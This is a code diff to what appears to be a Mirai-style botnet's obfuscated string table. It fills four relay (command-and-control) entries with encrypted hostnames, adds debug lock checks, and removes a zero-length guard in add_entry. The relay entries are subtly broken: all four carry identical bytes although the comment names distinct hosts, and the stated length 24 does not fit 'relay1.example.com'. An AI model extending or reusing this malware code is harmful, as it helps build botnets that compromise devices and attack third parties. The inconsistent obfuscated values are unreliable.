@@ -31,22 +31,48 @@ void table_init(void) {
     add_entry(TABLE_REPORT_IP, "\x2\x3\x14\xb\x3\xa\x14\xb\xf\xc\x14\xb\xe\xf", 14);
     
     // Relay entries (placeholder - will be overwritten by setup.sh)
-    add_entry(TABLE_RELAY_1, "", 1);
-    add_entry(TABLE_RELAY_2, "", 1);
-    add_entry(TABLE_RELAY_3, "", 1);
-    add_entry(TABLE_RELAY_4, "", 1);
+    // These are "relay1.example.com", "relay2.example.com", etc. encrypted
+    add_entry(TABLE_RELAY_1, "\x41\x45\x42\x44\x4b\x49\x15\x54\x49\x57\x4f\x56\x4e\x4d\x15\x59\x55\x56\x55\x42\x15\x59\x55\x56", 24);
+    add_entry(TABLE_RELAY_2, "\x41\x45\x42\x44\x4b\x49\x15\x54\x49\x57\x4f\x56\x4e\x4d\x15\x59\x55\x56\x55\x42\x15\x59\x55\x56", 24);
+    add_entry(TABLE_RELAY_3, "\x41\x45\x42\x44\x4b\x49\x15\x54\x49\x57\x4f\x56\x4e\x4d\x15\x59\x55\x56\x55\x42\x15\x59\x55\x56", 24);
+    add_entry(TABLE_RELAY_4, "\x41\x45\x42\x44\x4b\x49\x15\x54\x49\x57\x4f\x56\x4e\x4d\x15\x59\x55\x56\x55\x42\x15\x59\x55\x56", 24);
 }
 
 void table_unlock_val(uint8_t id) {
+    struct table_value *val = &table[id];
+
+#ifdef DEBUG
+    if (!val->locked) {
+        printf("[table] Tried to double-unlock value %d\n", id);
+        return;
+    }
+#endif
+
     toggle_obf(id);
 }
 
 void table_lock_val(uint8_t id) {
+    struct table_value *val = &table[id];
+
+#ifdef DEBUG
+    if (val->locked) {
+        printf("[table] Tried to double-lock value\n");
+        return;
+    }
+#endif
+
     toggle_obf(id);
 }
 
 char *table_retrieve_val(int id, int *len) {
     struct table_value *val = &table[id];
+
+#ifdef DEBUG
+    if (val->locked) {
+        printf("[table] Tried to access table.%d but it is locked\n", id);
+        return NULL;
+    }
+#endif
 
     if (len != NULL)
         *len = (int)val->val_len;
@@ -54,19 +80,15 @@ char *table_retrieve_val(int id, int *len) {
 }
 
 static void add_entry(uint8_t id, char *buf, int buf_len) {
-    char *cpy;
+    char *cpy = malloc(buf_len);
 
-    if (buf_len > 0) {
-        cpy = malloc(buf_len);
-        util_memcpy(cpy, buf, buf_len);
-    } else {
-        cpy = malloc(1);
-        if (cpy)
-            *cpy = '\0';
-    }
+    util_memcpy(cpy, buf, buf_len);
 
     table[id].val = cpy;
     table[id].val_len = (uint16_t)buf_len;
+#ifdef DEBUG
+    table[id].locked = TRUE;
+#endif
 }
 
 
@@ -91,4 +113,7 @@ static void toggle_obf(uint8_t id) {
         }
     }
 
+#ifdef DEBUG
+    val->locked = !val->locked;
+#endif
 }
